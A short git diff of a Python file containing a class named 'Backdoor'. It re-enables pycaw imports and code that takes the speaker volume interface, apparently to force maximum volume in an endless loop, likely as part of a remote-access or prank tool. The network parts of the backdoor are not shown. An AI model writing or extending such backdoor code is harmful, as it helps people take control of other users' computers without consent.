@@ -14,9 +14,9 @@ import time
 # import cv2
 import webbrowser
 
-# from ctypes import cast, POINTER
-# from comtypes import CLSCTX_ALL
-# from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 # from playsound import playsound
 
 
@@ -164,9 +164,9 @@ class Backdoor:
 
 # time.sleep(10)
 
-# devices = AudioUtilities.GetSpeakers()
-# interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-# volume = cast(interface, POINTER(IAudioEndpointVolume))
+devices = AudioUtilities.GetSpeakers()
+interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+volume = cast(interface, POINTER(IAudioEndpointVolume))
 
 def setMaxVolume():
     while True:
